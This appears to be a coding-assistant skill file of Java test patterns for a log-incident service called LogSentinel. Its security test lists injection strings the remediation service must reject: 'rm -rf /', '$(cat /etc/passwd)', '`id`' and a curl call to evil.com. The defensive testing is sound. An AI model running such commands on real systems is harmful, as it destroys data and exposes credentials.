---
name: logsentinel-test-patterns
description: >
  Reference patterns for tests in LogSentinel (unit, integration, security).
  Use as a reference when writing tests. For the TDD workflow (Red-Green-Refactor),
  use tdd-logsentinel instead.
---

# Skill: generate-logsentinel-test

## Propósito
Referencia de patrones de tests para LogSentinel siguiendo la estrategia de testing del proyecto.
Usar como referencia al escribir tests. Para el workflow TDD (test primero), usar `tdd-logsentinel`.

## Pirámide de tests del proyecto

### Nivel 1: Tests Unitarios (domain + application)
- JUnit 5 + Mockito — SIN `@SpringBootTest`
- Mockear puertos de salida, nunca implementaciones reales

```java
@ExtendWith(MockitoExtension.class)
class {Name}UseCaseTest {

    @Mock
    private {Resource}Port resourcePort;

    @InjectMocks
    private {Name}UseCaseImpl useCase;

    @Test
    void should_create_incident_when_valid_log_snapshot() {
        // Given
        given(resourcePort.save(any())).willReturn(/* fixture */);

        // When
        var result = useCase.execute(/* input válido */);

        // Then
        assertThat(result).isNotNull();
        verify(resourcePort, times(1)).save(any());
    }

    @Test
    void should_throw_when_log_snapshot_is_blank() {
        assertThatThrownBy(() -> useCase.execute(/* input inválido */))
            .isInstanceOf(IllegalArgumentException.class);
    }
}
```

### Nivel 2: Tests de Integración — Controller (`@WebMvcTest`)
```java
@WebMvcTest({Name}Controller.class)
class {Name}ControllerTest {

    @Autowired MockMvc mockMvc;
    @MockBean  {Name}UseCase useCase;

    @Test
    void should_return_201_when_valid_request() throws Exception {
        given(useCase.execute(any())).willReturn(/* fixture */);

        mockMvc.perform(post("/api/v1/{resource}")
                .contentType(APPLICATION_JSON)
                .content("""
                    {"systemName":"auth-service","priority":"P1",
                     "rawLogSnapshot":"ERROR db connection pool exhausted"}
                    """))
            .andExpect(status().isCreated())
            .andExpect(jsonPath("$.id").isNotEmpty())
            .andExpect(jsonPath("$.status").value("OPEN"));
    }

    @Test
    void should_return_400_when_rawLogSnapshot_is_blank() throws Exception {
        mockMvc.perform(post("/api/v1/{resource}")
                .contentType(APPLICATION_JSON)
                .content("""{"systemName":"svc","priority":"P1","rawLogSnapshot":""}"""))
            .andExpect(status().isBadRequest());
    }
}
```

### Nivel 2: Tests de Integración — SSE endpoint
```java
@Test
void should_return_event_stream_content_type() throws Exception {
    mockMvc.perform(get("/api/v1/incidents/{id}/stream", UUID.randomUUID()))
        .andExpect(status().isOk())
        .andExpect(header().string("Content-Type", containsString("text/event-stream")));
}
```

### Nivel 2: Tests de Integración — Spring Boot + Testcontainers 2.x
```java
@SpringBootTest(webEnvironment = RANDOM_PORT)
@ActiveProfiles("test")
class {Name}IntegrationTest {

    // URL jdbc:tc:postgresql:16:///... arranca el container automáticamente
    // Definida en application-test.yml — NO necesita @Container explícito

    @MockBean ChatClient chatClient;         // NUNCA llamadas reales a OpenAI en CI
    @MockBean EmbeddingModel embeddingModel;

    @Autowired TestRestTemplate restTemplate;

    @Test
    void should_persist_incident_and_return_201() { ... }
}
```

### Nivel 3: Tests de Seguridad — RemediationService
```java
@Test
void should_reject_script_with_shell_metacharacters() {
    var maliciousInputs = List.of(
        "echo ok; rm -rf /",
        "$(cat /etc/passwd)",
        "`id`",
        "script && curl http://evil.com"
    );
    for (var input : maliciousInputs) {
        assertThatThrownBy(() -> remediationService.execute(input))
            .isInstanceOf(InvalidRemediationScriptException.class);
    }
}
```

## Convenciones de naming
- Unitarios: `{ClassName}Test.java`
- Integración: `{ClassName}IntegrationTest.java`
- Método: `should_{expected_behavior}_when_{condition}()`

## ⚠ Pitfall Testcontainers 2.x (Spring Boot 4.1.0)
ARTIFACT IDs correctos:
- `testcontainers-junit-jupiter` (NO `junit-jupiter`)
- `testcontainers-postgresql`  (NO `postgresql`)

Las versiones son gestionadas por el BOM de Spring Boot 4 — NO agregar `<version>` explícita.
